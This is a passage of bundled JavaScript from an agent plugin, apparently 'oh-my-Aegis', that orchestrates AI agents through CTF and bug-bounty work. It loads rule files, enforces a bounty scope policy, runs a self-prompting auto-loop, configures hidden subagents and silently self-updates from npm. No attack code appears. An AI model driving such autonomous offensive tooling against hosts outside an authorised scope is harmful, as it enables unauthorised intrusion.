        const dirents = readdirSync4(dir, { withFileTypes: true });
        entries = dirents.map((d) => ({
          name: d.name,
          path: join16(dir, d.name),
          isDir: d.isDirectory(),
          isFile: d.isFile()
        }));
      } catch {
        warnings.push(`Failed to scan Claude rules dir: ${relative4(this.directory, dir)}`);
        return;
      }
      for (const entry of entries) {
        if (mdFiles.length >= 80) {
          return;
        }
        if (entry.isDir) {
          walk(entry.path, depth + 1);
          continue;
        }
        if (!entry.isFile) {
          continue;
        }
        if (entry.name.toLowerCase().endsWith(".md")) {
          mdFiles.push(entry.path);
        }
      }
    };
    walk(rulesDir, 0);
    for (const filePath of mdFiles) {
      let st;
      try {
        st = statSync6(filePath);
        sourceMtimeMs = Math.max(sourceMtimeMs, st.mtimeMs);
      } catch {
        continue;
      }
      if (!st.isFile()) {
        continue;
      }
      if (st.size > 256 * 1024) {
        warnings.push(`Skipped large Claude rule file: ${relative4(this.directory, filePath)}`);
        continue;
      }
      let text = "";
      try {
        text = readFileSync12(filePath, "utf-8");
      } catch {
        warnings.push(`Failed to read Claude rule file: ${relative4(this.directory, filePath)}`);
        continue;
      }
      const parsed = ClaudeRulesCache.parseFrontmatterPaths(text);
      const rel = relative4(this.directory, filePath);
      const body = parsed.body.trim();
      const globs = parsed.paths.map((p) => p.trim()).filter(Boolean);
      const res = [];
      for (const glob of globs) {
        try {
          res.push(globToRegExp(glob));
        } catch {
          continue;
        }
      }
      rules.push({
        sourcePath: filePath,
        relPath: rel,
        body,
        pathGlobs: globs,
        pathRes: res
      });
    }
    this.rulesCache.lastLoadAt = Date.now();
    this.rulesCache.sourceMtimeMs = sourceMtimeMs;
    this.rulesCache.rules = rules;
    this.rulesCache.warnings = warnings;
  }
  static parseFrontmatterPaths(text) {
    const lines = text.split(/\r?\n/);
    if (lines.length < 3 || lines[0].trim() !== "---") {
      return { body: text, paths: [] };
    }
    let endIdx = -1;
    for (let i = 1;i < lines.length; i += 1) {
      if (lines[i].trim() === "---") {
        endIdx = i;
        break;
      }
    }
    if (endIdx === -1) {
      return { body: text, paths: [] };
    }
    const fm = lines.slice(1, endIdx);
    const body = lines.slice(endIdx + 1).join(`
`);
    const paths = [];
    let inPaths = false;
    for (const rawLine of fm) {
      const line = rawLine.trimEnd();
      if (!inPaths) {
        if (/^paths\s*:/i.test(line.trim())) {
          inPaths = true;
        }
        continue;
      }
      const m = line.match(/^\s*-\s*(.+)\s*$/);
      if (!m) {
        break;
      }
      let value = (m[1] ?? "").trim();
      if (value.startsWith('"') && value.endsWith('"') || value.startsWith("'") && value.endsWith("'")) {
        value = value.slice(1, -1);
      }
      if (value) {
        paths.push(value);
      }
    }
    return { body, paths };
  }
}

// src/index-core.ts
var _packageJson = await Promise.resolve().then(() => __toESM(require_package(), 1));
var AEGIS_VERSION = typeof _packageJson.version === "string" ? _packageJson.version : "0.0.0";
var OhMyAegisPlugin = async (ctx) => {
  const configWarnings = [];
  const config3 = loadConfig(ctx.directory, { onWarning: (msg) => configWarnings.push(msg) });
  const availableSkills = discoverAvailableSkills(ctx.directory);
  let appendLatencySample = () => {};
  const notesStore = new NotesStore(ctx.directory, config3.markdown_budget, config3.notes.root_dir, {
    asyncPersistence: true,
    flushDelayMs: 35,
    onFlush: (metric) => {
      appendLatencySample({
        kind: "notes.flush",
        ...metric
      });
    }
  });
  let notesReady = true;
  const latencyBuffer = [];
  let latencyFlushTimer = null;
  const flushLatencyBuffer = () => {
    if (!notesReady || latencyBuffer.length === 0) {
      return;
    }
    try {
      const path = join17(notesStore.getRootDirectory(), "latency.jsonl");
      const payload = latencyBuffer.join("");
      latencyBuffer.length = 0;
      appendFileSync5(path, payload, "utf-8");
    } catch (error92) {}
  };
  appendLatencySample = (sample) => {
    if (!notesReady) {
      return;
    }
    try {
      latencyBuffer.push(`${JSON.stringify({ at: new Date().toISOString(), ...sample })}
`);
      if (latencyBuffer.length >= 128) {
        if (latencyFlushTimer) {
          clearTimeout(latencyFlushTimer);
          latencyFlushTimer = null;
        }
        flushLatencyBuffer();
        return;
      }
      if (!latencyFlushTimer) {
        latencyFlushTimer = setTimeout(() => {
          latencyFlushTimer = null;
          flushLatencyBuffer();
        }, 50);
        if (latencyFlushTimer && typeof latencyFlushTimer.unref === "function") {
          latencyFlushTimer.unref();
        }
      }
    } catch (error92) {}
  };
  const softBashOverrideByCallId = new Map;
  const SOFT_BASH_OVERRIDE_TTL_MS = 600000;
  const pruneSoftBashOverrides = () => {
    const now = Date.now();
    for (const [callId, entry] of softBashOverrideByCallId.entries()) {
      if (now - entry.addedAt > SOFT_BASH_OVERRIDE_TTL_MS) {
        softBashOverrideByCallId.delete(callId);
      }
    }
    if (softBashOverrideByCallId.size <= 200) {
      return;
    }
    const entries = [...softBashOverrideByCallId.entries()].sort((a, b) => a[1].addedAt - b[1].addedAt);
    for (let i = 0;i < entries.length - 200; i += 1) {
      softBashOverrideByCallId.delete(entries[i][0]);
    }
  };
  const readContextByCallId = new Map;
  const injectedContextPathsBySession = new Map;
  const activeAgentBySession = new Map;
  const searchModeRequestedBySession = new Set;
  const searchModeGuidancePendingBySession = new Set;
  const injectedContextPathsFor = (sessionID) => {
    const existing = injectedContextPathsBySession.get(sessionID);
    if (existing)
      return existing;
    const created = new Set;
    injectedContextPathsBySession.set(sessionID, created);
    return created;
  };
  const injectedClaudeRulePathsBySession = new Map;
  const injectedClaudeRulePathsFor = (sessionID) => {
    const existing = injectedClaudeRulePathsBySession.get(sessionID);
    if (existing)
      return existing;
    const created = new Set;
    injectedClaudeRulePathsBySession.set(sessionID, created);
    return created;
  };
  const writeToolOutputArtifact = (params) => {
    try {
      if (!notesReady) {
        return null;
      }
      const root = notesStore.getRootDirectory();
      const safeSessionID = normalizeSessionID(params.sessionID);
      const base = join17(root, "artifacts", "tool-output", safeSessionID);
      mkdirSync8(base, { recursive: true });
      const stamp = new Date().toISOString().replace(/[:.]/g, "-");
      const fileName = `${stamp}_${normalizeToolName(params.tool)}_${normalizeToolName(params.callID)}.txt`;
      const path = join17(base, fileName);
      const header = [
        `TITLE: ${params.title}`,
        `TOOL: ${params.tool}`,
        `SESSION: ${params.sessionID}`,
        `CALL: ${params.callID}`,
        "---",
        ""
      ].join(`
`);
      writeFileSync6(path, `${header}${params.output}
`, "utf-8");
      return path;
    } catch {
      return null;
    }
  };
  const scopePolicyCache = {
    lastLoadAt: 0,
    sourcePath: null,
    sourceMtimeMs: 0,
    result: { ok: false, reason: "not_loaded", warnings: [] }
  };
  const claudeRulesCacheInstance = new ClaudeRulesCache(ctx.directory);
  const getClaudeDenyRules = () => claudeRulesCacheInstance.getDenyRules();
  const getClaudeRules = () => claudeRulesCacheInstance.getRules();
  const safeNoteWrite = (label, action) => {
    if (!notesReady) {
      return;
    }
    try {
      action();
    } catch {
      notesReady = false;
    }
  };
  const HOT_PATH_LATENCY_TOOLS = new Set([
    "edit",
    "write",
    "aegis_memory_delete",
    "task",
    "todowrite",
    "bash"
  ]);
  const SLOW_HOOK_THRESHOLD_MS = 120;
  const maybeRecordHookLatency = (hook, input, startedAt) => {
    const durationMs = Number(process.hrtime.bigint() - startedAt) / 1e6;
    const isHot = HOT_PATH_LATENCY_TOOLS.has(input.tool) || input.tool.startsWith("aegis_memory_");
    const logAll = config3.debug.log_all_hooks;
    if (!logAll && !isHot && durationMs < SLOW_HOOK_THRESHOLD_MS) {
      return;
    }
    appendLatencySample({
      kind: "hook",
      hook,
      tool: input.tool,
      sessionID: input.sessionID,
      callID: input.callID,
      durationMs: Number(durationMs.toFixed(3))
    });
    if (durationMs >= SLOW_HOOK_THRESHOLD_MS * 2) {
      safeNoteWrite("latency.hook", () => {
        notesStore.recordScan(`Slow hook detected: hook=${hook} tool=${input.tool} duration_ms=${durationMs.toFixed(1)} session=${input.sessionID}`);
      });
    }
  };
  const noteHookError = (label, error92) => {
    const message = error92 instanceof Error ? error92.message : String(error92);
    safeNoteWrite(label, () => {
      notesStore.recordScan(`hook-error ${label}: ${message}`);
    });
  };
  const runClaudeCompatHookOrThrow = async (hookName, payload) => {
    const result = await runClaudeHook({
      projectDir: ctx.directory,
      hookName,
      payload,
      timeoutMs: 5000
    });
    if (!result.ok) {
      throw new AegisPolicyDenyError(result.reason);
    }
  };
  const runClaudeCompatHookBestEffort = async (hookName, payload) => {
    const result = await runClaudeHook({
      projectDir: ctx.directory,
      hookName,
      payload,
      timeoutMs: 5000
    });
    if (!result.ok) {
      safeNoteWrite("claude.hook", () => {
        notesStore.recordScan(`Claude hook ${hookName} soft-fail: ${result.reason}`);
      });
      notesStore.flushNow();
    }
  };
  try {
    notesStore.ensureFiles();
  } catch {
    notesReady = false;
  }
  if (configWarnings.length > 0) {
    safeNoteWrite("config.warnings", () => {
      for (const w of configWarnings.slice(0, 20)) {
        notesStore.recordScan(`Config warning: ${w}`);
      }
      if (configWarnings.length > 20) {
        notesStore.recordScan(`Config warning: (${configWarnings.length - 20} more warnings omitted)`);
      }
    });
  }
  const autoCompactLastAtBySession = new Map;
  const AUTO_COMPACT_MIN_INTERVAL_MS = 60000;
  const maybeAutoCompactNotes = (sessionID, reason) => {
    if (!config3.recovery.enabled || !config3.recovery.auto_compact_on_context_failure) {
      return;
    }
    const now = Date.now();
    const last = autoCompactLastAtBySession.get(sessionID) ?? 0;
    if (now - last < AUTO_COMPACT_MIN_INTERVAL_MS) {
      return;
    }
    autoCompactLastAtBySession.set(sessionID, now);
    let actions = [];
    try {
      actions = notesStore.compactNow();
    } catch {
      actions = [];
    }
    safeNoteWrite("recovery.compact", () => {
      notesStore.recordScan(`Auto compact ran: reason=${reason} actions=${actions.join("; ") || "(none)"}`);
    });
  };
  const toastLastAtBySessionKey = new Map;
  const startupTerminalBannerShownBySession = new Set;
  const startupToastShownBySession = new Set;
  const startupToastPendingBySession = new Set;
  const topLevelSessionIDs = new Set;
  const startupToastFallbackCheckedBySession = new Set;
  let npmAutoUpdateTriggered = false;
  const maybeWriteStartupTerminalBanner = (sessionID) => {
    if (!config3.tui_notifications.startup_terminal_banner) {
      return;
    }
    if (!sessionID || startupTerminalBannerShownBySession.has(sessionID)) {
      return;
    }
    startupTerminalBannerShownBySession.add(sessionID);
    const lines = [
      "",
      "============================================================",
      `oh-my-Aegis v${AEGIS_VERSION}`,
      "Aegis is orchestrating your workflow.",
      "============================================================",
      ""
    ];
    try {
      process.stdout.write(`${lines.join(`
`)}
`);
    } catch {}
  };
  const emitToast = async (params) => {
    const tuiApi = ctx.client?.tui;
    const rawToastFn = tuiApi?.showToast;
    if (typeof rawToastFn !== "function") {
      return false;
    }
    const toastFn = rawToastFn.bind(tuiApi);
    const title = params.title.slice(0, 80);
    const message = params.message.slice(0, 240);
    const attempts = [
      {
        body: {
          title,
          message,
          variant: params.variant,
          duration: params.durationMs
        }
      },
      {
        directory: ctx.directory,
        title,
        message,
        variant: params.variant,
        duration: params.durationMs
      },
      {
        query: { directory: ctx.directory },
        body: {
          title,
          message,
          variant: params.variant,
          duration: params.durationMs
        }
      }
    ];
    for (const args of attempts) {
      try {
        await toastFn(args);
        return true;
      } catch {}
    }
    return false;
  };
  const maybeShowToast = async (params) => {
    if (!config3.tui_notifications.enabled) {
      return;
    }
    const now = Date.now();
    const throttleMs = config3.tui_notifications.throttle_ms;
    const mapKey = `${params.sessionID}:${params.key}`;
    const last = toastLastAtBySessionKey.get(mapKey) ?? 0;
    if (throttleMs > 0 && now - last < throttleMs) {
      return;
    }
    toastLastAtBySessionKey.set(mapKey, now);
    const duration5 = params.durationMs ?? 4000;
    await emitToast({
      title: params.title,
      message: params.message,
      variant: params.variant,
      durationMs: duration5
    });
  };
  const maybeShowStartupToast = async (sessionID) => {
    if (!config3.tui_notifications.startup_toast) {
      return;
    }
    if (!sessionID || startupToastShownBySession.has(sessionID) || startupToastPendingBySession.has(sessionID)) {
      return;
    }
    const tuiApi = ctx.client?.tui;
    const rawShowToast = tuiApi?.showToast;
    if (typeof rawShowToast !== "function") {
      return;
    }
    const showToast3 = rawShowToast.bind(tuiApi);
    startupToastPendingBySession.add(sessionID);
    startupToastShownBySession.add(sessionID);
    const STARTUP_SPINNER_FRAMES = ["\xB7", "\u2022", "\u25CF", "\u25CB", "\u25CC", "\u25E6", " "];
    const frameIntervalMs = 100;
    const totalDurationMs = 5000;
    const totalFrames = 50;
    const maxFrames = Math.min(totalFrames, Math.floor(totalDurationMs / frameIntervalMs));
    const duration5 = frameIntervalMs + 50;
    const message = "Aegis is orchestrating your workflow.";
    try {
      for (let frame = 0;frame < maxFrames; frame += 1) {
        const spinner = STARTUP_SPINNER_FRAMES[frame % STARTUP_SPINNER_FRAMES.length];
        await showToast3({
          body: {
            title: `${spinner} oh-my-Aegis ${AEGIS_VERSION}`,
            message,
            variant: "info",
            duration: duration5
          }
        });
        if (frame < maxFrames - 1) {
          await new Promise((resolve8) => setTimeout(resolve8, frameIntervalMs));
        }
      }
    } finally {
      startupToastPendingBySession.delete(sessionID);
    }
  };
  const scheduleStartupToast = (sessionID) => {
    setTimeout(() => {
      maybeShowStartupToast(sessionID);
    }, 0);
  };
  const maybeScheduleStartupToastFallback = (sessionID) => {
    if (!sessionID || !topLevelSessionIDs.has(sessionID)) {
      return;
    }
    if (startupToastFallbackCheckedBySession.has(sessionID)) {
      return;
    }
    if (startupToastShownBySession.has(sessionID) || startupToastPendingBySession.has(sessionID)) {
      return;
    }
    startupToastFallbackCheckedBySession.add(sessionID);
    scheduleStartupToast(sessionID);
  };
  const maybeHandleStartupAnnouncement = (type, props) => {
    if (type !== "session.created" && type !== "session.updated") {
      return { handled: false };
    }
    const info = props.info && typeof props.info === "object" ? props.info : props.session && typeof props.session === "object" ? props.session : undefined;
    const sessionID = typeof info?.id === "string" ? info.id : typeof props.sessionID === "string" ? props.sessionID : "";
    const parentID = typeof info?.parentID === "string" ? info.parentID : "";
    if (sessionID && !parentID) {
      topLevelSessionIDs.add(sessionID);
      maybeWriteStartupTerminalBanner(sessionID);
      scheduleStartupToast(sessionID);
    }
    return { handled: type === "session.created" };
  };
  const sendSessionPromptAsync = async (sessionID, text, metadata) => {
    const sessionClient = ctx.client?.session;
    const promptAsync = sessionClient?.promptAsync;
    if (!sessionClient || typeof promptAsync !== "function") {
      return false;
    }
    const parts = [
      {
        type: "text",
        text,
        synthetic: true,
        metadata
      }
    ];
    const fn = promptAsync;
    const attempts = [
      { path: { id: sessionID }, query: { directory: ctx.directory }, body: { parts } },
      { sessionID, directory: ctx.directory, parts }
    ];
    for (const args of attempts) {
      try {
        await fn.call(sessionClient, args);
        return true;
      } catch {}
    }
    return false;
  };
  const maybeAutoloopTick = async (sessionID, trigger) => {
    if (!config3.auto_loop.enabled) {
      return;
    }
    const state = store.get(sessionID);
    if (!state.modeExplicit) {
      return;
    }
    if (!state.autoLoopEnabled) {
      return;
    }
    if (config3.auto_loop.only_when_ultrawork && !state.ultraworkEnabled) {
      return;
    }
    if (config3.auto_loop.stop_on_verified && state.mode === "CTF" && state.latestVerified.trim().length > 0) {
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.stop", () => {
        notesStore.recordScan("Auto loop stopped: submission accepted evidence present.");
      });
      await maybeShowToast({
        sessionID,
        key: "autoloop_stop_verified",
        title: "oh-my-Aegis: autoloop stopped",
        message: "Verified output present; autoloop disabled.",
        variant: "info"
      });
      return;
    }
    const now = Date.now();
    if (state.autoLoopLastPromptAt > 0 && now - state.autoLoopLastPromptAt < config3.auto_loop.idle_delay_ms) {
      return;
    }
    if (state.autoLoopIterations >= config3.auto_loop.max_iterations) {
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.stop", () => {
        notesStore.recordScan(`Auto loop stopped: max iterations reached (${config3.auto_loop.max_iterations}).`);
      });
      return;
    }
    const decision = route(state, config3);
    logRouteDecision(sessionID, state, decision, "auto_loop");
    const iteration = state.autoLoopIterations + 1;
    const promptLines = [
      "[oh-my-Aegis auto-loop]",
      `trigger=${trigger} iteration=${iteration}`,
      `next_route=${decision.primary}`,
      "Rules:",
      "- Build/update a short execution plan first, then reflect it in todowrite.",
      "- Keep 2-6 TODO items when possible; allow multiple pending items but only one in_progress.",
      "- Execute via the next_route (use the task tool once).",
      "- Record progress with ctf_orch_event and stop this turn."
    ];
    if (searchModeRequestedBySession.has(sessionID) && searchModeGuidancePendingBySession.has(sessionID)) {
      promptLines.push("- [search-mode] active: immediately run ctf_parallel_dispatch plan=scan and ctf_subagent_dispatch type=librarian; then collect with ctf_parallel_collect message_limit=5 and pick a winner if clear.");
      searchModeGuidancePendingBySession.delete(sessionID);
    }
    const promptText = promptLines.join(`
`);
    const promptAvailable = typeof ctx.client?.session?.promptAsync === "function";
    if (!promptAvailable) {
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.error", () => {
        notesStore.recordScan("Auto loop disabled: client.session.promptAsync unavailable.");
      });
      return;
    }
    store.recordAutoLoopPrompt(sessionID);
    safeNoteWrite("autoloop.tick", () => {
      notesStore.recordScan(`Auto loop tick: session=${sessionID} route=${decision.primary} (${trigger})`);
    });
    try {
      const sent = await sendSessionPromptAsync(sessionID, promptText, {
        source: "oh-my-Aegis.auto-loop",
        iteration,
        next_route: decision.primary
      });
      if (sent) {
        return;
      }
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.error", () => {
        notesStore.recordScan("Auto loop disabled: failed to send promptAsync.");
      });
      noteHookError("autoloop", new Error("promptAsync failed for all supported payload shapes"));
    } catch (error92) {
      store.setAutoLoopEnabled(sessionID, false);
      safeNoteWrite("autoloop.error", () => {
        notesStore.recordScan("Auto loop disabled: failed to send promptAsync.");
      });
      noteHookError("autoloop", error92);
    }
  };
  const getBountyScopePolicy = () => {
    const now = Date.now();
    if (now - scopePolicyCache.lastLoadAt < 60000) {
      return scopePolicyCache.result.ok ? scopePolicyCache.result.policy : null;
    }
    scopePolicyCache.lastLoadAt = now;
    const result = loadScopePolicyFromWorkspace(ctx.directory, {
      candidates: config3.bounty_policy.scope_doc_candidates,
      includeApexForWildcardAllow: config3.bounty_policy.include_apex_for_wildcard_allow
    });
    scopePolicyCache.result = result;
    if (result.ok) {
      const changed = scopePolicyCache.sourcePath !== result.policy.sourcePath || scopePolicyCache.sourceMtimeMs !== result.policy.sourceMtimeMs;
      scopePolicyCache.sourcePath = result.policy.sourcePath;
      scopePolicyCache.sourceMtimeMs = result.policy.sourceMtimeMs;
      if (changed) {
        safeNoteWrite("scope.policy", () => {
          notesStore.recordScan(`Scope doc loaded: ${result.policy.sourcePath} (allow=${result.policy.allowedHostsExact.length + result.policy.allowedHostsSuffix.length}, deny=${result.policy.deniedHostsExact.length + result.policy.deniedHostsSuffix.length}, blackout=${result.policy.blackoutWindows.length})`);
          for (const w of result.policy.warnings) {
            notesStore.recordScan(`Scope doc warning: ${w}`);
          }
        });
      }
      return result.policy;
    }
    return null;
  };
  const store = new SessionStore(ctx.directory, ({ sessionID, state, reason }) => {
    safeNoteWrite("observer", () => {
      notesStore.recordChange(sessionID, state, reason, route(state, config3));
    });
  }, config3.default_mode, config3.notes.root_dir, {
    asyncPersistence: true,
    flushDelayMs: 25,
    onPersist: (metric) => {
      appendLatencySample({
        kind: "session.persist",
        ...metric
      });
    }
  });
  const appendOrchestrationMetric = (entry) => {
    if (!notesReady) {
      return;
    }
    try {
      const path = join17(notesStore.getRootDirectory(), "metrics.json");
      let parsed = [];
      if (existsSync16(path)) {
        try {
          parsed = JSON.parse(readFileSync13(path, "utf-8"));
        } catch {
          parsed = [];
        }
      }
      const list = Array.isArray(parsed) ? parsed : [];
      list.push(entry);
      writeFileSync6(path, `${JSON.stringify(list, null, 2)}
`, "utf-8");
    } catch (error92) {
      noteHookError("metrics.append", error92);
    }
  };
  const routeCounterSnapshots = new Map;
  const ROUTE_REASON_MAX_LEN = 240;
  const ROUTE_TEXT_MAX_LEN = 80;
  const ROUTE_FOLLOWUPS_MAX_COUNT = 4;
  const STUCK_STALE_TOOL_PATTERN_THRESHOLD = 3;
  const compactText = (value, maxLen) => {
    if (typeof value !== "string") {
      return "";
    }
    return value.replace(/\s+/g, " ").trim().slice(0, maxLen);
  };
  const appendOperationalRouteLog = (record3) => {
    if (!notesReady) {
      return;
    }
    try {
      const path = join17(notesStore.getRootDirectory(), "route_decisions.jsonl");
      appendFileSync5(path, `${JSON.stringify(record3)}
`, "utf-8");
    } catch (error92) {
      noteHookError("route-log.append", error92);
    }
  };
  const logRouteDecision = (sessionID, state, decision, source) => {
    if (!notesReady) {
      return;
    }
    const threshold = Math.max(1, Number(config3.stuck_threshold) || 2);
    const counters = {
      noNewEvidenceLoops: state.noNewEvidenceLoops,
      samePayloadLoops: state.samePayloadLoops,
      verifyFailCount: state.verifyFailCount,
      staleToolPatternLoops: state.staleToolPatternLoops
    };
    const stuckNow = isStuck(state, config3);
    const trippedCounters = [];
    if (counters.noNewEvidenceLoops >= threshold)
      trippedCounters.push("noNewEvidenceLoops");
    if (counters.samePayloadLoops >= threshold)
      trippedCounters.push("samePayloadLoops");
    if (counters.verifyFailCount >= threshold)
      trippedCounters.push("verifyFailCount");
    if (counters.staleToolPatternLoops >= STUCK_STALE_TOOL_PATTERN_THRESHOLD) {
      trippedCounters.push("staleToolPatternLoops");
    }
    const previous = routeCounterSnapshots.get(sessionID);
    const crossedCounters = [];
    if (!previous || previous.noNewEvidenceLoops < threshold) {
      if (counters.noNewEvidenceLoops >= threshold)
        crossedCounters.push("noNewEvidenceLoops");
    }
    if (!previous || previous.samePayloadLoops < threshold) {
      if (counters.samePayloadLoops >= threshold)
        crossedCounters.push("samePayloadLoops");
    }
    if (!previous || previous.verifyFailCount < threshold) {
      if (counters.verifyFailCount >= threshold)
        crossedCounters.push("verifyFailCount");
    }
    if (!previous || previous.staleToolPatternLoops < STUCK_STALE_TOOL_PATTERN_THRESHOLD) {
      if (counters.staleToolPatternLoops >= STUCK_STALE_TOOL_PATTERN_THRESHOLD) {
        crossedCounters.push("staleToolPatternLoops");
      }
    }
    const followups = (Array.isArray(decision.followups) ? decision.followups : []).map((item) => compactText(item, ROUTE_TEXT_MAX_LEN)).filter((item) => item.length > 0).slice(0, ROUTE_FOLLOWUPS_MAX_COUNT);
    const at = new Date().toISOString();
    appendOperationalRouteLog({
      kind: "RouteDecision",
      at,
      source,
      sessionID,
      primary: compactText(decision.primary, ROUTE_TEXT_MAX_LEN),
      followups,
      reason: compactText(decision.reason, ROUTE_REASON_MAX_LEN),
      phase: state.phase,
      targetType: state.targetType,
      counters,
      stuck: {
        value: stuckNow,
        threshold,
        staleToolPatternThreshold: STUCK_STALE_TOOL_PATTERN_THRESHOLD,
        trippedCounters
      }
    });
    const stuckBecameTrue = previous ? !previous.stuck && stuckNow : stuckNow;
    if (stuckBecameTrue || crossedCounters.length > 0) {
      appendOperationalRouteLog({
        kind: "StuckTrigger",
        at,
        source,
        sessionID,
        primary: compactText(decision.primary, ROUTE_TEXT_MAX_LEN),
        phase: state.phase,
        targetType: state.targetType,
        stuckBecameTrue,
        crossedCounters,
        trippedCounters,
        counters
      });
    }
    routeCounterSnapshots.set(sessionID, {
      noNewEvidenceLoops: counters.noNewEvidenceLoops,
      samePayloadLoops: counters.samePayloadLoops,
      verifyFailCount: counters.verifyFailCount,
      staleToolPatternLoops: counters.staleToolPatternLoops,
      stuck: stuckNow
    });
  };
  const appendLedgerFromRuntime = (sessionID, event, evidenceType, confidence, summary, source) => {
    if (!notesReady)
      return;
    const entry = {
      at: new Date().toISOString(),
      sessionID,
      event,
      evidenceType,
      confidence,
      summary: summary.replace(/\s+/g, " ").trim().slice(0, 240),
      source
    };
    appendEvidenceLedger(notesStore.getRootDirectory(), entry);
    const scored = scoreEvidence([entry]);
    store.setCandidateLevel(sessionID, scored.level);
  };
  const appendOrchestrationLedgerFromRuntime = (sessionID, event, evidenceType, confidence, summary, source) => {
    if (!notesReady)
      return;
    const entry = {
      at: new Date().toISOString(),
      sessionID,
      event,
      evidenceType,
      confidence,
      summary: summary.replace(/\s+/g, " ").trim().slice(0, 240),
      source
    };
    appendEvidenceLedger(notesStore.getRootDirectory(), entry);
  };
  const sessionRecoveryManager = createSessionRecoveryManager({
    client: ctx.client,
    directory: ctx.directory,
    notesStore,
    config: config3,
    store
  });
  const contextWindowRecoveryManager = createContextWindowRecoveryManager({
    client: ctx.client,
    directory: ctx.directory,
    notesStore,
    config: config3,
    store,
    getDefaultModel: (sessionID) => {
      const state = store.get(sessionID);
      const model = state.lastTaskModel.trim().length > 0 ? state.lastTaskModel.trim() : state.lastTaskSubagent ? agentModel(state.lastTaskSubagent) : undefined;
      return model ?? agentModel("aegis-exec");
    }
  });
  if (!config3.enabled) {
    return {};
  }
  configureParallelPersistence(ctx.directory, config3.notes.root_dir);
  const parallelBackgroundManager = new ParallelBackgroundManager({
    client: ctx.client,
    directory: ctx.directory,
    config: config3
  });
  const controlTools = createControlTools(store, notesStore, config3, ctx.directory, ctx.client, parallelBackgroundManager);
  const readiness = buildReadinessReport(ctx.directory, notesStore, config3);
  if (notesReady && (!readiness.ok || readiness.warnings.length > 0)) {
    const entries = [];
    if (readiness.checkedConfigPath) {
      entries.push(`config=${readiness.checkedConfigPath}`);
    }
    if (readiness.issues.length > 0) {
      entries.push(`issues=${readiness.issues.join("; ")}`);
    }
    if (readiness.warnings.length > 0) {
      entries.push(`warnings=${readiness.warnings.join("; ")}`);
    }
    safeNoteWrite("readiness", () => {
      notesStore.recordScan(`Readiness check: ${entries.join(" | ")}`);
    });
  }
  return {
    event: async ({ event }) => {
      try {
        if (!event || typeof event !== "object") {
          return;
        }
        const e = event;
        const type = typeof e.type === "string" ? e.type : "";
        const props = e.properties ?? {};
        parallelBackgroundManager.handleEvent(type, props);
        await sessionRecoveryManager.handleEvent(type, props);
        await contextWindowRecoveryManager.handleEvent(type, props);
        const startupHandled = maybeHandleStartupAnnouncement(type, props);
        if (startupHandled.handled) {
          return;
        }
        if (type === "session.idle") {
          const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
          if (sessionID) {
            maybeScheduleStartupToastFallback(sessionID);
            await maybeAutoloopTick(sessionID, "session.idle");
          }
          return;
        }
        if (type === "session.status") {
          const sessionID = typeof props.sessionID === "string" ? props.sessionID : "";
          const status = props.status;
          if (sessionID && status?.type === "idle") {
            maybeScheduleStartupToastFallback(sessionID);
            await maybeAutoloopTick(sessionID, "session.status idle");
          }
        }
      } catch (error92) {
        noteHookError("event", error92);
      }
    },
    config: async (runtimeConfig) => {
      try {
        if (config3.enable_builtin_mcps) {
          const existingMcp = runtimeConfig.mcp ?? {};
          const builtinMcps = createBuiltinMcps({
            projectDir: ctx.directory,
            disabledMcps: config3.disabled_mcps,
            memoryStorageDir: config3.memory.storage_dir
          });
          const merged = {
            ...builtinMcps,
            ...existingMcp
          };
          const builtinMemory = builtinMcps["memory"];
          if (builtinMemory) {
            const existingMemory = existingMcp["memory"];
            const env = existingMemory && existingMemory.type === "local" && existingMemory.environment ? existingMemory.environment : null;
            const filePath = env && typeof env.MEMORY_FILE_PATH === "string" ? env.MEMORY_FILE_PATH : "";
            const keepExisting = Boolean(filePath) && isAbsolute5(filePath) && isPathInsideRoot(filePath, ctx.directory);
            if (!keepExisting) {
              merged.memory = builtinMemory;
            }
          }
          runtimeConfig.mcp = merged;
        }
        const existingAgents = isRecord(runtimeConfig.agent) ? runtimeConfig.agent : {};
        const defaultModel = typeof runtimeConfig.model === "string" ? runtimeConfig.model : undefined;
        const nextAgents = { ...existingAgents };
        const ensureHiddenInternalSubagent = (name, factory) => {
          const current = nextAgents[name];
          if (isRecord(current)) {
            nextAgents[name] = { ...current, mode: "subagent", hidden: true };
            return;
          }
          const seeded = factory();
          nextAgents[name] = { ...seeded, mode: "subagent", hidden: true };
        };
        const existingAegis = nextAgents.Aegis;
        if (isRecord(existingAegis)) {
          const existingPermission = isRecord(existingAegis.permission) ? existingAegis.permission : {};
          nextAgents.Aegis = {
            ...existingAegis,
            mode: "primary",
            hidden: false,
            permission: {
              ...existingPermission,
              edit: "deny",
              bash: "deny",
              webfetch: "deny",
              external_directory: "deny",
              doom_loop: "deny"
            }
          };
        } else {
          nextAgents.Aegis = createAegisOrchestratorAgent(defaultModel);
        }
        ensureHiddenInternalSubagent("aegis-plan", () => createAegisPlanAgent(defaultModel));
        ensureHiddenInternalSubagent("aegis-exec", () => createAegisExecAgent(defaultModel));
        ensureHiddenInternalSubagent("aegis-deep", () => createAegisDeepAgent(defaultModel));
        ensureHiddenInternalSubagent("aegis-explore", () => createAegisExploreAgent());
        ensureHiddenInternalSubagent("aegis-librarian", () => createAegisLibrarianAgent());
        runtimeConfig.agent = nextAgents;
      } catch (error92) {
        noteHookError("config", error92);
      }
    },
    tool: {
      ...controlTools
    },
    "chat.message": async (input, output) => {
      try {
        if (typeof input.agent === "string" && input.agent.trim().length > 0) {
          activeAgentBySession.set(input.sessionID, baseAgentName(input.agent.trim()).toLowerCase());
        }
        const state = store.get(input.sessionID);
        const role = output.message?.role;
        const isUserMessage = role === "user";
        let ultraworkEnabled = state.ultraworkEnabled;
        if (isUserMessage && !npmAutoUpdateTriggered) {
          npmAutoUpdateTriggered = true;
          (async () => {
            try {
              const result = await maybeNpmAutoUpdatePackage({
                packageName: "oh-my-aegis",
                currentVersion: AEGIS_VERSION,
                silent: true
              });
              safeNoteWrite("npm.auto_update", () => {
                notesStore.recordScan(`npm auto-update: ${result.status} (${result.detail})`);
              });
            } catch {}
          })();
        }
        const messageText = textFromParts(output.parts);
        const contextText = [textFromUnknown(input), messageText].filter(Boolean).join(`
`);
        if (isUserMessage && /\b(ultrawork|ulw)\b/i.test(contextText)) {
          store.setUltraworkEnabled(input.sessionID, true);
